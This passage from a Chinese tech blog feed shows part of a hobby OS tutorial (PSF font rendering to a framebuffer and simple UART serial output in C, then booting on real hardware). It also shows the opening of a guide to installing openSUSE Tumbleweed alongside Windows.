<span class="hljs-title">psf1_header</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> magic;     <span class="hljs-comment">/* magic number for identification */</span><br>    <span class="hljs-type">uint8_t</span> font_mode;  <span class="hljs-comment">/* PSF font mode */</span><br>    <span class="hljs-type">uint8_t</span> char_size;  <span class="hljs-comment">/* PSF char size */</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF2_FONT_MAGIC 0x864ab572</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> magic;             <span class="hljs-comment">/* magic number for PSF */</span><br>    <span class="hljs-type">uint32_t</span> version;           <span class="hljs-comment">/* zero */</span><br>    <span class="hljs-type">uint32_t</span> header_size;       <span class="hljs-comment">/* offset of bitmaps in file, 32 */</span><br>    <span class="hljs-type">uint32_t</span> flags;             <span class="hljs-comment">/* 0 if there&#x27;s no unicode table */</span><br>    <span class="hljs-type">uint32_t</span> glyph_nr;          <span class="hljs-comment">/* number of glyphs */</span><br>    <span class="hljs-type">uint32_t</span> bytes_per_glyph;   <span class="hljs-comment">/* size of each glyph */</span><br>    <span class="hljs-type">uint32_t</span> height;            <span class="hljs-comment">/* height in pixels */</span><br>    <span class="hljs-type">uint32_t</span> width;             <span class="hljs-comment">/* width in pixels */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>字体位图有着其固定的宽度与高度，虽然字体的宽度并不一定对齐到 8 bit，但是存储空间需要对齐到 8 bit 也就是 1 字节，因此<strong>位图数据中会有空数据填充段</strong>，以一个 12x12 的 PSF 位图为示例：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">           padding<br> Font data    |<br>+----------+ +--+<br><span class="hljs-number">000001100000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000011110000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000110011000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">001100001100</span> <span class="hljs-number">0000</span><br><span class="hljs-number">011000000110</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>由此我们可以通过如下代码来解析字体文件并在屏幕上显示文字（二代规范）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_font_psf_start[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_font_psf_end[];<br><br><span class="hljs-comment">/* char output info */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> fb_cursor_x, fb_cursor_y;    <span class="hljs-comment">/* count by chars */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> max_ch_nr_x, max_ch_nr_y;<br><br><span class="hljs-comment">/* font info */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> *<span class="hljs-title">boot_font</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width, font_height;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width_bytes;<br><span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *glyph_table;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> bytes_per_glyph, glyph_nr;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_fb_new_line</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    fb_cursor_x = <span class="hljs-number">0</span>;<br>    fb_cursor_y++;<br>    <br>    <span class="hljs-comment">/* we may need to scroll up */</span><br>    <span class="hljs-keyword">if</span> (fb_cursor_y &gt;= max_ch_nr_y) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; ((max_ch_nr_y - <span class="hljs-number">1</span>) * font_height); y++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                framebuffer_base[x + y * framebuffer_width] = <br>                framebuffer_base[x + (y + font_height) * framebuffer_width];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; font_height; y++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                <span class="hljs-type">size_t</span> lines = (y + (max_ch_nr_y - <span class="hljs-number">1</span>) * font_height);<br>                <span class="hljs-type">size_t</span> loc = lines * framebuffer_width + x;<br>                framebuffer_base[loc] = bg;<br>            &#125;<br>        &#125;<br><br>        fb_cursor_y--;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_fb</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch, <span class="hljs-type">uint32_t</span> fg, <span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> *glyph = glyph_table;<br>    <span class="hljs-type">size_t</span> loc;<br><br>    <span class="hljs-comment">/* if char out of range, output null */</span><br>    <span class="hljs-keyword">if</span> (ch &lt; glyph_nr) &#123;<br>        glyph += ch * bytes_per_glyph;<br>    &#125;<br><br>    loc =  fb_cursor_y * font_height * framebuffer_width;<br>    loc += fb_cursor_x * font_width;<br><br>    <span class="hljs-comment">/* output the font to frame buffer */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_y = <span class="hljs-number">0</span>; ch_y &lt; font_height; ch_y++) &#123;<br>        <span class="hljs-type">uint8_t</span> mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_x = <span class="hljs-number">0</span>; ch_x &lt; font_width; ch_x++) &#123;<br>            <span class="hljs-keyword">if</span> ((*(glyph + ch_x / <span class="hljs-number">8</span>) &amp; mask) != <span class="hljs-number">0</span>) &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = fg;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = bg;<br>            &#125;<br><br>            mask &gt;&gt;= <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (ch_x % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br>            &#125;<br>        &#125;<br><br>        glyph += font_width_bytes;<br>    &#125;<br><br>    <span class="hljs-comment">/* move cursor */</span><br>    fb_cursor_x++;<br><br>    <span class="hljs-comment">/* we may need to move to new line */</span><br>    <span class="hljs-keyword">if</span> (fb_cursor_x &gt;= max_ch_nr_x) &#123;<br>        boot_putchar_fb_new_line(bg);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_init_font</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    boot_font = (<span class="hljs-keyword">struct</span> psf2_header*) _binary_font_psf_start;<br><br>    font_width_bytes = (boot_font-&gt;width + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span>;<br>    font_width = font_width_bytes * <span class="hljs-number">8</span>;<br>    font_height = boot_font-&gt;height;<br><br>    glyph_table = (<span class="hljs-type">uint8_t</span>*)_binary_font_psf_start+boot_font-&gt;header_size;<br>    glyph_nr = boot_font-&gt;glyph_nr;<br>    bytes_per_glyph = boot_font-&gt;bytes_per_glyph;<br><br>    fb_cursor_x = fb_cursor_y = <span class="hljs-number">0</span>;<br>    max_ch_nr_x = framebuffer_width / font_width;<br>    max_ch_nr_y = framebuffer_height / font_height;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Extra：-串口输出初探"><a href="#Extra：-串口输出初探" class="headerlink" title="Extra： 串口输出初探"></a><em>Extra： 串口输出初探</em></h3><blockquote><p>注，因为我们目前处在 boot 部分，因此笔者仅会实现一个最简陋的串口输出代码，在后续的 real kernel 部分的代码中我们会重新实现一个更加完备的串口驱动</p></blockquote><p>串口输出是以前老 IBM 机喜欢用的方法，包括 Linux kernel 也支持串口输出功能（当你使用 qemu 运行时若添加了 <code>-nographic</code> 参数 QEMU 会将虚拟机的串口 0 的输出重定向到当前终端，也可以直接在 qemu 的图形界面切换到 <code>serial 0</code>），目前这个输出方式已经很少被使用了， <del>毕竟都什么年代了还在抽传统香烟？</del> 不过在一些特殊场景这个方法还是偶尔会被用到的（例如 headless console），因此这一节我们简单讲讲如何通过串口进行字符输出</p><p><strong>串行通讯端口</strong> （Serial Port，aka COM）通常由 <em>通用异步收发传输器</em> （Universal Asynchronous Receiver&#x2F;Transmitter， UART）进行控制，其内部时钟波特率通常是 115200，目前比较常用的是 <a href="https://gunkies.org/wiki/EIA_RS-232_serial_line_interface">EIA-RS-232</a> 标准，针脚数通常是 25 针或 9 针（后者用的比较多）</p><p><img src="https://s2.loli.net/2024/06/12/jUkhowJWRO67bHg.png" alt="25 针与 9 针"></p><blockquote><p>更多的微机原理知识这里不再赘叙，我们接下来简单讲讲串口如何使用</p></blockquote><p>单个串口的 <em>寄存器组</em> 会被映射到指定的 IO port 起始的区域，我们通过访问串口的不同寄存器进行相应的操作，通常情况下串口映射到端口的<strong>基地址</strong>如下：</p><blockquote><p>需要注意的是 <em>仅有前两个串口的端口地址是固定不变的，其余串口的端口地址未必如下表所示</em>  </p><p>对于守旧的 BIOS 用户，<a href="https://www.cs.yale.edu/flint/feng/cos/resources/BIOS/Resources/biosdata.htm">BIOS Data Area</a> 可以帮助你获取包括 COM 地址在内的各种信息</p><p>对于 <del>不抽传统香烟的</del> 现代 UEFI 用户，</p></blockquote><table><thead><tr><th>COM Port</th><th>IO Port Base</th></tr></thead><tbody><tr><td>COM1</td><td>0x3F8</td></tr><tr><td>COM2</td><td>0x2F8</td></tr><tr><td>COM3</td><td>0x3E8</td></tr><tr><td>COM4</td><td>0x2E8</td></tr><tr><td>COM5</td><td>0x5F8</td></tr><tr><td>COM6</td><td>0x4F8</td></tr><tr><td>COM7</td><td>0x5E8</td></tr><tr><td>COM8</td><td>0x4E8</td></tr></tbody></table><p>不同偏移的寄存器含义如下（来自 <a href="https://wiki.osdev.org/Serial_Ports">OSDEV wiki</a>）：</p><table><thead><tr><th>IO Port Offset</th><th>Setting of DLAB</th><th>I&#x2F;O Access</th><th>Register mapped to this port</th></tr></thead><tbody><tr><td>+0</td><td>0</td><td>Read</td><td>Receive buffer.</td></tr><tr><td>+0</td><td>0</td><td>Write</td><td>Transmit buffer.</td></tr><tr><td>+1</td><td>0</td><td>Read&#x2F;Write</td><td>Interrupt Enable Register.</td></tr><tr><td>+0</td><td>1</td><td>Read&#x2F;Write</td><td>With DLAB set to 1, this is the least significant byte of the divisor value for setting the baud rate.</td></tr><tr><td>+1</td><td>1</td><td>Read&#x2F;Write</td><td>With DLAB set to 1, this is the most significant byte of the divisor value.</td></tr><tr><td>+2</td><td>-</td><td>Read</td><td>Interrupt Identification</td></tr><tr><td>+2</td><td>-</td><td>Write</td><td>FIFO control registers</td></tr><tr><td>+3</td><td>-</td><td>Read&#x2F;Write</td><td>Line Control Register. The most significant bit of this register is the DLAB.</td></tr><tr><td>+4</td><td>-</td><td>Read&#x2F;Write</td><td>Modem Control Register.</td></tr><tr><td>+5</td><td>-</td><td>Read</td><td>Line Status Register.</td></tr><tr><td>+6</td><td>-</td><td>Read</td><td>Modem Status Register.</td></tr><tr><td>+7</td><td>-</td><td>Read&#x2F;Write</td><td>Scratch Register.</td></tr></tbody></table><p>方便起见，在启动阶段我们就不编写太过于复杂的串口驱动了，简单来说，要通过串口进行字符输出，我们首先需要往一部分寄存器中写入特定数据进行串口初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">boot_init_com_internal</span><span class="hljs-params">(<span class="hljs-type">size_t</span> base_port)</span><br>&#123;<br>    <span class="hljs-comment">/* disable all interrupts */</span><br>    outb(base_port + COM_REG_IER, <span class="hljs-number">0x00</span>);<br><br>    <span class="hljs-comment">/* enable DLAB to set bound rate divisor */</span><br>    outb(base_port + COM_REG_LCR, <span class="hljs-number">0x80</span>);<br><br>    <span class="hljs-comment">/* set divisor to 38400 baud */</span><br>    outb(base_port + COM_REG_DLL, <span class="hljs-number">0x03</span>);<br>    outb(base_port + COM_REG_DLM, <span class="hljs-number">0x00</span>);<br><br>    <span class="hljs-comment">/* 8 data bits, parity off, 1 stop bit, DLAB latch off */</span><br>    outb(base_port + COM_REG_LCR, <span class="hljs-number">0x03</span>);<br><br>    <span class="hljs-comment">/* enable FIFO */</span><br>    outb(base_port + COM_REG_FCR, <span class="hljs-number">0xC7</span>);<br>    <br>    <span class="hljs-comment">/* enable IRQs, set RTS/DSR */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x0B</span>);<br><br>    <span class="hljs-comment">/* set in loopback mode and test serial chip */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x1E</span>);<br><br>    <span class="hljs-comment">/* write a byte to test serial chip */</span><br>    outb(base_port + COM_REG_TX, <span class="hljs-string">&quot;arttnba3&quot;</span>[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* check if serial is faulty */</span><br>    <span class="hljs-keyword">if</span> (inb(base_port + COM_REG_RX) != <span class="hljs-string">&quot;arttnba3&quot;</span>[<span class="hljs-number">0</span>]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* set in normal mode */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x0F</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后直接往串口里 <code>outb()</code> 即可输出字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_com</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> res;<br><br>    <span class="hljs-comment">/* wait for the port to be ready */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        res = inb(com_base + COM_REG_LSR);<br>        res &amp;= <span class="hljs-number">0x20</span>;<br>    &#125; <span class="hljs-keyword">while</span> (res == <span class="hljs-number">0</span>);<br><br>    outb(com_base, ch);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们为 QEMU 附加 <code>-nographic</code> 的参数进行测试，可以看到串口输出的数据一切正常：</p><blockquote><p><code>Ctrl + A</code> 后再 <code>C</code> 进入 QEMU 调试台，<code>q</code> 退出</p></blockquote><p><img src="https://s2.loli.net/2024/06/13/27ocRUJMamzyQwK.png" alt="真是串串又口口啊"></p><h2 id="真机启动"><a href="#真机启动" class="headerlink" title="真机启动"></a>真机启动</h2><p>接下来我们使用 <code>make</code> 命令编译代码，将 <code>out</code> 目录下的 <code>kernel.bin</code> 文件放到 U 盘 EFI 分区中的 <code>boot</code> 目录下，重启计算机并选择 U 盘启动，接下来——</p><p><strong>ClosureOS，启动——！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041505.png"></p><p>我们成功制作完成了一个<strong>能够在真机上运行的操作系统，而并非大部分教科书上的那些只能在虚拟机里跑的小玩具</strong>，虽然目前仅有最基本的雏形 ：）</p><blockquote><p>我们将在后续博客当中逐步完善这个操作系统（🕊🕊🕊）</p></blockquote><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://elixir.bootlin.com/linux/latest/source">Linux source code - Bootlin</a></p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">Multiboot2 Specification version 2.0</a></p><p><a href="https://wiki.osdev.org/Main_Page">OSDev wiki</a> ← 非常好维基，使我OS运行，爱来自瓷器❤</p><p><a href="https://zhuanlan.zhihu.com/UEFIBlog">UEFI 和 BIOS 探秘</a></p><p><a href="https://wiki.osdev.org/PC_Screen_Font">PC Screen Font</a></p><p><a href="https://os.phil-opp.com/">Writing an OS in Rust</a></p><p><a href="https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/">https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/</a></p><p><a href="https://oscarcx.com/tech/usb-boot-winpe-and-linux-via-grub2.html">用grub2制作多重引导的WinPE&amp;Linux启动U盘</a></p><p><a href="https://gunkies.org/wiki/Main_Page">Computer History Wiki</a></p><p><a href="https://wiki.osdev.org/Serial_Ports">Serial Ports</a></p><p><a href="https://www.scs.stanford.edu/09wi-cs140/pintos/specs/pc16550d.pdf">PC16550D Universal Asynchronous Receiver&#x2F;Transmitter with FIFOs</a></p><p><a href="https://www.keil.com/dd/vtr/3880/9788.htm">NXP (founded by Philips) LPC2148 — UARTs: (UART0-1)</a></p><p><a href="https://www.lookrs232.com/rs232/lcr.htm">Line Control Register (LCR)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;遥遥领先！遥遥领先！遥遥领先！&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="开发手记" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Assembly Language" scheme="https://arttnba3.github.io/tags/Assembly-Language/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x01】如何正确打开 openSUSE Tumbleweed</title>
    <link href="https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/</id>
    <published>2023-11-23T14:22:31.000Z</published>
    <updated>2024-07-03T08:25:55.884Z</updated>
    
    <content type="html"><![CDATA[<p>你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者此前一直在用 Arch Linux，但是最近在帮中国大陆的一些 CTF 赛事出题时遇到了一些比较奇怪的问题：在使用 Docker 启动的 Ubuntu 环境中，用来启动题目服务的 <code>xinetd</code> <strong>无法正常工作</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010554.png"></p><p>不过也不是完全连不上，但是要等很久，笔者怀疑可能是内核安全策略的缘故（因为在容器内部用 <code>nc</code> 也连不上），于是笔者测试了市面上比较主流的口碑比较好的几个 Linux 发行版，除了原生 Ubuntu 以外<strong>也就只有 openSUSE 能够正常运行</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010630.png"></p><blockquote><p>当然， <em>有一个发行版是完全连不上，是谁呢</em> ： </p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010725.png"></p></blockquote><p>这样的话笔者完全没有办法在本地测试题目，再加上 Arch Linux 用起来 <em>总是感觉有哪里没有配好的怪异感</em> ，只适合比较闲的时候折腾玩玩，日常使用或许还是一个常规点的发行版会更加安心一些，于是笔者在 Fedora Workstation 短期驻留了一段时间之后选择转向 openSUSE Tumbleweed ，和 Arch 一样是一个滚动发行版，但是 <em>据说德国工艺比较值得令人信赖，SUSE 在企业市场的份额似乎也不小</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124011110.png"></p><blockquote><p>需要注意的是，openSUSE 这个词读音为 <code>/ˌoʊpənˈsuːzə/</code> ，相信不少人和笔者一样一开始会读成 <code>/ˌoʊpənˈsuːz/</code> ，推荐观看<a href="https://www.bilibili.com/video/BV1ab411K7Zs/">这个视频</a>（笑</p></blockquote><p>事实证明，openSUSE Tumbleweed 给笔者一种<strong>又好又烂的感觉</strong>，好就好在德国工艺的 YaST 确实方便易用， <em>仿佛一个和蔼可亲的邻家大蜥蜴一般令人安心</em> ，不好就在于官方自带的中文安装依托答辩，不仅安装界面蹦方块，切换到 Wayland 后自带的 fcitx5 直接罢工（与此同时<strong>先装英文系统再装中文语言包与输入法却能正常使用</strong>）</p><p>但这并非是最要命的点，<strong>用的人少、社区活跃度不足才是最致命的</strong>，openSUSE 早期在中国大陆宣传不足，RHEL 和 Ubuntu 近乎蚕食掉所有的 Linux 市场后才姗姗来迟，<strong>现在在中国大陆能用的镜像站似乎都不剩几个</strong>，<a href="https://forum.suse.org.cn/">中文论坛</a>活跃度还比不上一些快死了的贴吧（<a href="https://forums.opensuse.org/c/english/6">英文论坛</a>的活跃度还可以， <em>不过事实上国内真正称得上活着的 Linux distro-specific forum 除了 Arch 以外好像也没别的了</em> ，这么一看 openSUSE CN 论坛建设其实还可以 ），Wiki 建设度也不太足，这就导致很多问题只能参照其他发行版的类似情况自己再缝缝补补</p><blockquote><p>最直接的后果就是在缺乏指引的情况下，笔者第一次在物理机上尝试 Tumbleweed 时 docker 直接无法正常拉镜像，第二次在物理机上尝试 Tumbleweed 时由于未更新 GRUB 配置导致几次在几次重新启动系统之后<strong>登录界面直接进不去了，只有一个鼠标能动</strong>，切进 tty 以后也一筹莫展（根本找不到使用 openSUSE 出现类似问题的案例与解决方案），在重装了七八次系统后按照第三方社区 ASUS Linux 的配置教程无意中解决了这个问题</p></blockquote><p>但是 <del>抛开事实不谈</del>  <em>抛开这些小毛病不谈，openSUSE 依旧是做得不错的发行版</em> ，Leap 有着超乎想象的稳定性与维护周期，Tumbleweed 在保证了其稳定性的同时依旧能紧追最前沿的技术，虽然国内没啥人用但在国外其实还是有着不错的口碑，因此笔者最终选择尝试在 openSUSE Tumbleweed 上开始自己新的旅程</p><blockquote><p>至于为什么不用 Ubuntu 是因为 Ubuntu Desktop 依托答辩，经常能卡出各种玄学问题，软件包旧且难配，snap 这样不遵守 FHS 而且后端完全受商业公司 Canonical 把控的混沌邪恶的东西更是让人谔谔，只适合放服务器上或是放在虚拟机里玩</p><p>至于为什么不用 Debian 则是因为在笔者感受起来这也是一个更适合在服务器上稳定跑应用的系统，能折腾的空间也不多（<del>年轻人自己用的电脑当然要滚动发行版天天滚，我每天稳定在 Arch 上滚 114 次在 centos stream 上滚 514 次在 tumbleweed 上滚 1919 次并用 Gentoo 自行编译 810 次</del>）， 当然肯定有人要杠说有 Debian Sid 这样的版本，但是在笔者看来未免有点过于不稳定了， <em>当然更重要的是</em> 笔者手上没有<a href="https://github.com/moesoha/debian-media-box">Debian 盒装安装媒介</a> （笑</p></blockquote><h1 id="0x01-安装前的准备工作"><a href="#0x01-安装前的准备工作" class="headerlink" title="0x01. 安装前的准备工作"></a>0x01. 安装前的准备工作</h1><blockquote><p>如果要和笔者一样安装 Windows + Linux 双系统的话<strong>建议先安装 Windows</strong>，因为如果先安装 Linux 的话 Windows 会对 Linux 空间乱动 ：(</p></blockquote><blockquote><p>因为安装的时候没有拍屏所以这里笔者用虚拟机进行截图以示意，<del>毕竟总不能让👴把现在安好的系统再重新安一遍吧，那闲得没事做属于是</del></p></blockquote><p>首先还是在 Windows 上打开 <code>磁盘管理→压缩卷</code> 划出来一块未分配空间，后面我们将在这块空间上安装 openSUSE Tumbleweed：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123234639.png"></p><p>然后在<a href="https://get.opensuse.org/tumbleweed/#download">官网</a>下载镜像，并烧录到 U 盘中（大家应该都和笔者一样使用 U 盘进行安装吧），这里笔者选择使用 <a href="https://etcher.balena.io/#download-etcher">balenaEtcher</a> 进行烧录，直接选择镜像和 U 盘就行：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123235028.png"></p><h1 id="0x02-安装-openSUSE-Tumbleweed"><a href="#0x02-安装-openSUSE-Tumbleweed" class="headerlink" title="0x02. 安装 openSUSE Tumbleweed"></a>0x02. 安装 openSUSE Tumbleweed</h1><p>openSUSE 系统使用 <code>YaST</code> 进行安装，非常地舒适简便的同时也提供给我们许多可以客制化的地方</p><blockquote><p>和前面一样都是在虚拟机中重新截的图，因为笔者安装时忘了拍了：）</p></blockquote><p>惯例重启进入 UEFI 界面关闭安全启动将 U 盘设为第一个启动项进入 openSUSE Tumbleweed 的安装界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124003638.png"></p><blockquote><p>如果你是物理机安装而且没插网线会有一个额外的配置网络的环节，按照指引正常选择无线网卡连 WiFi 就行</p></blockquote><p>这里注意<strong>安装语言选择 English</strong>，因为自带的中文安装有些小问题（<a href="https://www.bilibili.com/video/BV1F7411G7jH/?t=2095">他们那个是有点差的.avi</a>），系统安装结束后我们再手动在系统中去安装中文相关的东西：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004125.png"></p><p>Online Repositories 建议全选：</p><p><img 